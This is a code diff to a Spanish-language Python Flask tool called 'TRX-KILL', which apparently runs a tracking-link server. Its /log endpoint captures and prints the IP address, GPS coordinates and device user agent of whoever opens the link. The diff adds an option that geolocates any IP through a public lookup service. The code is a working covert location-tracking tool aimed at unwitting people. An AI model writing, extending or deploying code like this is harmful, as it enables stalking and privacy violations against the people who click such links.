@@ -4,12 +4,14 @@ import threading
 import subprocess
 import re
 import time
+import requests
 from flask import Flask, request, render_template_string
 
 app = Flask('TRX-KILL')
 URL_FINAL = "https://www.google.com"
 
 def force_clean():
+    # Limpieza forzada sin librerías externas complicadas
     os.system('fuser -k 5000/tcp > /dev/null 2>&1')
     time.sleep(0.5)
 
@@ -40,7 +42,7 @@ def index(): return render_template_string(HTML_FINAL)
 def log():
     d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print(f"\n\033[1;31m[!] ESPERANDO DATOS....\033[0m")
+    print(f"\n\033[1;31m[!] DATOS CAPTURADOS\033[0m")
     print(f"\033[1;32m[*] IP: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m\n")
     return "OK"
 
@@ -63,7 +65,7 @@ def banner():
 def main():
     while True:
         banner()
-        print("\033[1;33m [1] \033[1;37mINFO NÚMERO\n\033[1;33m [2] \033[1;37mRASTREO (LINK)\n\033[1;33m [3] \033[1;37mCREADOR\n\033[1;33m [4] \033[1;37mLICENCIA Y USO\n\033[1;33m [5] \033[1;37mVERSIÓN\n\033[1;33m [6] \033[1;37mACTUALIZACIÓN\n\033[1;33m [7] \033[1;37mSALIR")
+        print("\033[1;33m [1] \033[1;37mINFO NÚMERO\n\033[1;33m [2] \033[1;37mRASTREO (LINK)\n\033[1;33m [3] \033[1;37mCREADOR\n\033[1;33m [4] \033[1;37mLICENCIA Y USO\n\033[1;33m [5] \033[1;37mVERSIÓN\n\033[1;33m [6] \033[1;37mACTUALIZACIÓN\n\033[1;33m [7] \033[1;37mINFORMACIÓN-IP\n\033[1;33m [8] \033[1;37mSALIR")
         opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         if opc == "1":
@@ -94,7 +96,14 @@ def main():
             time.sleep(1)
             print("\033[1;32m[+] El script está al día.\033[0m")
             input("\n[Enter] volver...")
-        elif opc == "7": break
+        elif opc == "7":
+            target_ip = input("Introduce la IP a analizar: ")
+            try:
+                res = requests.get(f"https://ipapi.co/{target_ip}/json/").json()
+                print(f"\n\033[1;32m[+] PAÍS: {res.get('country_name')}\n[+] CIUDAD: {res.get('city')}\n[+] ISP: {res.get('org')}\033[0m")
+            except: print("\033[1;31m[-] Error de conexión.\033[0m")
+            input("\n[Enter] volver...")
+        elif opc == "8": break
 
 if __name__ == "__main__":
     main()
